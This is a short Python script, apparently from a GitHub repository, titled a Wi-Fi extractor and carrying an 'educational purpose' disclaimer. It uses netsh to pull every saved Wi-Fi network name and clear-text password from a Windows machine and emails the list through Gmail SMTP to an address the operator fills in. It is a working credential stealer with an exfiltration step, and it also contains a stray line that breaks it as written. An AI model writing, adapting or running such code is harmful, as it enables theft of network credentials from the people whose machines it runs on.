#! py
# Python_WIFI_Extractor_Script
######################################
#Copyright of ZION ASHIRWADA MANAMUDALI, 2021     #
#https://github.com/zionashirwada/#
#This script is created only for educational purpose and do not use it for illeagal activities #
######################################
import subprocess
import re
import smtplib
from email.message import EmailMessage

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = list()


if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
           
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password == None:
                wifi_profile["password"] = None
            else:
                
                wifi_profile["password"] = password[1]
            
            wifi_list.append(wifi_profile)


email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"


email = EmailMessage()
# Who is the email from
email["from"] = "Ashirwada"
# To which email you want to send the email
email["to"] = "email_address"

email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)


with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    r
    smtp.starttls()
    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
    #           #senders email   # password for email
    smtp.login("login_name", "password")
    
    smtp.send_message(email)